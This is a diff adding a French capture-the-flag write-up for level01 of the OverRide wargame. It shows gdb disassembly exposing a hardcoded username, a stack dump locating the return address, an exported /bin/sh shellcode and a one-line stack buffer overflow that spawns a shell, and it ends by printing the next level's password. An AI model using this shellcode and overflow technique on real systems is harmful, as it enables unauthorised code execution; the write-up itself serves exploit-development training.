@@ -1,0 +1,60 @@
+ On vois ici que la fonction verify_user_name verifie que le username rentrer et bien egal a dat_wil
+
+ 0x08048478 <+20>:	mov    $0x804a040,%edx
+ 0x0804847d <+25>:	mov    $0x80486a8,%eax
+ 0x08048482 <+30>:	mov    $0x7,%ecx
+ 0x08048487 <+35>:	mov    %edx,%esi
+ 0x08048489 <+37>:	mov    %eax,%edi
+ 0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
+
+
+(gdb) x/s 0x80486a8
+0x80486a8:	 "dat_wil"
+
+(gdb) c
+Continuing.
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will
+verifying username....
+
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048579 in main ()
+
+(gdb) x/44 $esp
+0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
+0xffffd690:	0xffffd8ac	0x0000002f	0xffffd6ec	0x41414141 <-- buffer start
+0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd6b0:	0x41414141	0x41414141	0x000a4141	0x00000000
+0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6e0:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513 <-- EIP
+
+En regardant la memoire apres la saisie du mot de passe on peu en deduire le nombre de caractere a rentrer pour remplacer EIP et ainsi changer le cours du programme. (80 caractere + 4 de remplacement de l'EIP)
+
+A partir de ce moment la on va exporter un shellcode lancan la commande /bin/sh
+
+export SHELLCODE=`python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
+
+son addresse : 0xffffd89d
+
+(gdb) x/s *((char **) environ)
+0xffffd88d:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+(gdb) x 0xffffd89d
+0xffffd89d:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+
+commande a taper pour ouvir le shell :
+
+cat <(echo "dat_wil") <(python -c 'print("A" * 80 + "\x9d\xd8\xff\xff")') - | ./level01
+
+
+level01@OverRide:~$ cat <(echo "dat_wil") <(python -c 'print("A" * 80 + "\x9d\xd8\xff\xff")') - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
